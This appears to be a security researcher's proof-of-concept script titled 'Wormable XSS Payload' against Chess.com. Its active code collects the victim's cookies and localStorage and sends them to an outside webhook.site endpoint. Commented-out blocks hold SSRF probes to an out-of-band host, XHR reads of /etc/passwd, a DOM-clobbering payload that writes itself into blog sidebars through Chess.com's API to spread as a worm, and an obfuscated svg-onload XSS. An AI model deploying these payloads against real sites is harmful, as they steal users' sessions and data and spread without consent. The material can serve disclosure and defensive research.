// ==========================================
// Wormable XSS Payload - Chess.com 
// ==========================================
// alert("DOM Clobbering XSS by Hussein on: " + document.domain);

// <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
// <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
// <iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
// <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>


//(2)
// function addNewlines(str) 
// {var result = '';
// while (str.length > 0){
// result += str.substring(0, 100)+ '\n';
// r = str.substring(100);}
// return result;}
// x= new XMLHttpRequest();
// x.onload = function(){document.write(addNewlines(btoa(this.responseText)))};
// x.open("GET", "file:///etc/passwd");
// x.send();


// (1)
// x= new XMLHttpRequest();
// x.onload = function(){
// document.write(this.responseText)};
// x.open("GET", "file:///etc/passwd");
// x.send();

var userCookies = document.cookie;
var userStorage = JSON.stringify(localStorage);
var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/", {
    method: "POST",
    mode: "no-cors",
    body: exfilData
});
// const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
// const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
// const requestBody = {
//     "blogDetails": {
//         "url": "hacked-blog", //
//         "name": "Important Update",
//         "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
//         "sidebarBlock": maliciousSidebar
//     },
//     "updateMask": ""
// };

// // 4. (The Infection)
// fetch(apiUrl, {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json',
//         'Accept': 'application/json, text/plain, */*',
//         'Connect-Protocol-Version': '1'
//     },
//     credentials: 'include', 
//     body: JSON.stringify(requestBody)
// })
// .then(response => {
//     if (response.ok) {
//         fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49aeimpact=Worm_Propagated");
//     }
// });






// "Review1":"</script Matthew and .. ",

// "Review2":"Super Great Experience .. ><svg
// onload=eval(atob('YWxlcnQoJ1Jldmlld3MgU3RvcmVkIFhTUycp'))



